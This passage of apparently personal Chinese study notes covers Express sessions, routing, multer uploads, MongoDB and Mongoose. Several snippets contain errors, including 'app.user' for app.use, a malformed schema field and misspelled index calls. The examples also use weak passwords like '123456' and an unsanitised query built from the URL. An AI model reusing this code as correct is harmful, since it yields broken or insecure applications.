\"muouren7\";\n    res.send(\"session已经存储\")\n})\n//获取session\napp.get(\"/getsession\",(req,res)=>{\n    let name = req.session.username;\n    res.send(\"您的session是---\"+name)\n})\n\n//销毁session\napp.get(\"/destroySession\",(req,res)=>{\n    //方法1 将保存session的cookie时间设置为0，销毁全部session\n    req.session.cookie.maxAge = 0\n\n    //方法2 销毁指定session\n    req.session.username = \"\"\n\n    //方法3 destroy\n    req.session.destroy()\n\n})\n```\n## 8、将session保存在mongoDB\n导入**connect-mongo**的包\n```javascript\nconst session = require(\"express-session\")\nconst MongoStore = require(\"connect-mongo\")(session)\n\napp.user(session({\n    store: MongoStore.create({\n        url:\"你的mongoDb数据库地址\",\n        touchAfter:24*60*60\t\t\t\t//不管发出多少请求，24小时内只更新一次session\n    })\n}))\n```\n## 9、路由模块化\n将单个js文件内的路由拆分成多个js文件，可以理解为模块化\n主文件**app.js**\n```javascipt\nconst express = require(\"express\")\nvar app = express()\n\n//引入模块admin.js，这里admin.js与app.js位于同一级目录下\nvar admin = require(\"admin\")\n//配置中间件\napp.use(\"/admin\",admin)\n\napp.listen(8080,()=>{\n    console.log(\"已经在端口8080开启服务\");\n})\n```\n模块文件**admin.js**\n```javascript\nconst express = require(\"express\")\n\nvar router = express.Router()\n\n//url:http:127.0.0.1:8080/admin\nrouter.get(\"/\",(req,res)=>{\n    res.send(\"您已来到管理员模块\")\n})\n\n//url:http:127.0.0.1:8080/admin/manage\nrouter.get(\"/manage\",(req,res)=>{\n    res.send('您正在管理admin模块')\n})\n\n//\nmodule.exports = router\n```\n## 10、结合multer上传图片\n安装**multer**\n```shell\nnpm install --save multer\n```\nhtml代码如下，form表单中格式必须为**multipart/form-data**\n```javascript\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <form action=\"http://127.0.0.1:8080/profile\" method=\"post\" enctype=\"multipart/form-data\">\n        <input type=\"file\" name=\"pic\" >\n        <input type=\"submit\" value=\"提交\">\n    </form>\n</body>\n</html>\n```\n**app.js**中代码如下\n```javascript\nconst multer = require(\"multer\")\nconst path = require(\"path\")\n\nconst storage = multer.diskStorage({\n    //配置文件上传位置\n    destination: function (req, file, cb) {\n        cb(null, '/static/files')\n    },\n    //修改上传文件的后缀名\n    filename: function (req, file, cb) {\n        //获取后缀名\n        let extname = path.extname(file[\"originalname\"])\n        //设置后缀名\n        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9)\n        cb(null, file.fieldname + '-' + uniqueSuffix + extname)\n    }\n})\nconst upload = multer({ storage: storage })\n\napp.post(\"/profile\",upload.single('pic'),(req,res,nex)=>{\n    console.log(req.file)\n    res.send(req.file)\n})\n```\n## 11、node.js连接mongoDB\n如下\n```javascript\nconst MongoClinet = require(\"mongodb\").MongoClient\nconst DataBaseUrl = \"mongodb://127.0.0.1:27017/\"\t\t//mongoDB数据库地址\nvar app = express()\n\napp.get('/chick',function(req,resp){\n    let parse = url.parse(req.url)\n    let name = parse.query.split(\"=\")[1]\n    MongoClinet.connect(DataBaseUrl,function(err,db){\n        if(err){\n            console.log(\"数据库连接错误\");\n        }\n        let dbo = db.db(\"itying\")\n        let data = {\"name\":unescape(name)}\n        let msg = dbo.collection(\"user\").find(data).toArray((err,result)=>{\n            if(err){\n                console.log(\"查询出错\")\n            }\n            resp.cookie(\"username\",result[0][\"name\"],{maxAge:1000*60*60})\n            resp.send(result)\n            db.close()\n        })\n    })\n})\n```\n# Mongoose使用\n## 1、Demo\n```javascript\nconst mongoose = require(\"mongoose\")\n\nmongoose.connect(\"mongodb://127.0.0.1:27017/itying\")  //把数据库名字也加上\n//操作users表 定义一个Schema\nvar UserSchema = mongoose.Schema({\n    name:String,\n    age:Number,\n    status,Number\n})\n//定义model，第一个参数（表名必须为第一个参数的复数形式，且参数首字母必须大写），第二参数为定义的Schema，第三个参数（如果有，则对应此参数对应的集合，没有则是以第一个参数为准）\nvar User = mongoose.model('User',UserSchema,\"users\")\n//查询users集合的数据，第一个参数为过滤条件\nUser.find({},(err,doc)=>{\n    if(err){\n        console.log(err)\n    \treturn;\n    }\n    console.log\t(doc)\n})\n```\n## 2、增加一条数据\n```javascript\nvar u = new User({\n    name:\"muouren7\",\n    age:22\n})\nu.save((err,msg)=>{\n    if(err){\n        console.log(\"err:\"+err)\n        return\n    }\n    if(msg){\n        console.log(\"msg:\"+msg)\n    }\n})    //执行增加操作，回调函数可加可不加，msg为user的json数据\n```\n## 3、查询数量\n```javascript\n//2、查询users表数量，第一个{}中为过滤条件\nUser.countDocuments({},(err,num)=>{\n    if(err){\n        console.log(err)\n        return\n    }\n    console.log(\"返回值是:\"+num)\n})\n```\n## 4、修改数据记录\n```javascript\n//4、修改数据记录，参数1表示修改的条件，参数2表示修改的内容\n//例：将名字为张三的改为张三1234\nUser.updateOne({name:\"张三\"},{name:\"张三1234\"},(err,res)=>{\n    if(err){\n        console.log(err)\n        return\n    }\n    console.log(res)\n})\n```\n## 5、删除数据\n```javascript\n// 5、删除记录\nUser.deleteOne({name:\"zhangsan\"},(err,res)=>{\n    if(err){\n        console.log(err)\n    }\n    console.log(res)\n    console.log(\"删除成功\")\n})\n```\n# MongoDB\n## 1、数据库的创建、使用\n在cmd下运行，直接切换到数据库不能创建成功，必须插入一条数据\n```shell\nuse itying \t\t###创建名为itying的数据库\n```\n往itying数据库的user集合里插入一条数据（集合不用创建，直接操作）\n```shell\nuse itying\t\t###切换到itying数据库下\ndb.user.insert({\"name\":\"xiaoming\",\"age\":20});\n\nshow collections\t###展示当前数据库里所有的集合\ndb.user.find()\t\t###展示user集合下的数据\n\nshow dbs\t### 展示当前所有的数据库\n```\n## 2、删除集合\n```shell\n### 切换到itying数据库下\nuse itying\n###删除user集合\ndb.user.drop()\n```\n## 3、删除数据库\n```shell\n### 切换到itying数据库下\nuse itying\n### 删除当前数据库\ndb.dropDatabase()\n```\n## 4、插入数据\n```shell\ndb.表名.insert({\"name\":\"zhangsan\",\"age\":20});\n```\n## 5、查询\n```shell\n###\t1、查询所有记录\ndb.user.find()\n\n###\t2、查找age=22的数据\ndb.user.find({\"age\":22})\n\n###\t3、查询age>22的记录\ndb.user.find({age:{$gt:22}})\n\n###\t4、查询age<22的记录\ndb.user.find({age:{$lt:22}})\n\n###\t5、查询age>=25的记录\ndb.user.find({age:{$gte:25}})\n\n###\t6、查询age<=25的记录\ndb.user.find({age:{$lte:25}})\n\n###\t7、查询age>=23 并且 age<=26\ndb.user.find({age:{$gte:23,$lte:26}})\n\n###\t8、查询name中包含mongo的数据\t模糊查询\ndb.user.find({name:/mongo/})\n\n###\t9、查询name中以mongo开头的数据\ndb.user.find({name:/^mongo/})\n\n###\t10、查询指定列,只显示name，不显示age，第一个{}为条件参数\ndb.user.find({age:{$lte:25}},{name:1})\n\n### 11、按照年龄排序，1：升序\t2：降序\ndb.user.find().sort({age:1})\n\n### 12、查询前5条数据\ndb.user.find().limit(5)\n\n###\t13、查询10条以后的数据\ndb.user.find().skip(10)\n\n### 14、查询5-10之间的数据\ndb.user.find().limit(10).skip(5)\n\n### 15、or查询,查22或者25\ndb.user.find({$or:[{age:22},{age:25}]})\n\n### 16、统计age>25的个数\ndb.user.find({age:{$gt:25}}).count()\n```\n## 6、修改\n```shell\n###\t1、把名字叫做小明的年龄改为16\ndb.user.update({\"name\":\"小明\"},{$set:{\"age\":16}})\n```\n## 7、删除\n```shell\n### 1、删除age为26的\ndb.user.remove({age:26})\n```\n## 8、设置索引与复合索引（面临海量数据时提升查询速度）\n```shell\n###\t对username字段设置索引，1：升序\t\t2：降序\ndb.user.ensureIndex({\"username\":1})\ndb.user.createIndex({\"username\":1})\t\t##新版mongo命令\n\n###\t获取当前已经设置的索引\ndb.user.getIndexes()\n\n###\t删除索引\ndb.user.dropIndex({\"username\":1})\n\n### 复合索引\ndb.user.ensureIndex({\"usernam\":1,\"age\":-1})\n\n###\t设置唯一索引（必须唯一）\ndb.user.exsureIndex({\"userid\":1},{\"unique\":true})\t\t###\t设置userid为唯一索引，数据库中不能存在相同的userid\n```\n## 9、mongo权限配置\n1、创建超级管理员用户\n```shell\nuse admin\ndb.createUser({\n\tuser:'admin',\n\tpwd:'123456',\n\troles:[{role:'root',db:'admin'}]\n})\n```\n2、修改mongodb安装目录下的配置文件mongod.cfg文件，添加以下配置，开启连接验证，然后重启mongodb服务\n```shell\nsecurity:\n\tauthorization: enabled;\n```\n3、用超级管理员用户密码连接数据库\n```shell\nmongo admin -u 用户名 -p 密码\nmongo 127.0.0.1:27017/test -u user -p pwd\n```\n4、给eggcms数据库创建一个用户，只能访问eggcms不能访问其他数据库\n```shell\nuser eggcms\ndb.createUser({\n\tuser:'eggadmin',\n\tpwd:'123456',\n\troles:[{role:'dbOwner',db:'eggcms'}]\n})\n```\n## MongoDb数据库角色\n1、数据库用户角色：read、readWrite\n2、数据库管理角色：dbAdmin、dbOwner、userAdmin\n\n3、集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager\n\n4、备份恢复角色：backup、restore\n\n5、所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase\n\n6、超级用户：root\n```shell\n### 查看当前库下的管理员\nshow user\n\n###\t删除用户\ndb.dropUser(\"eggadmin\")\n\n###\t修改用户密码\ndb.updateUser(\"admin\",{pwd:'password'})\n\n### 密码认证\ndb.auth(\"admin\",\"password\")\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["笔记","nodejs"]}]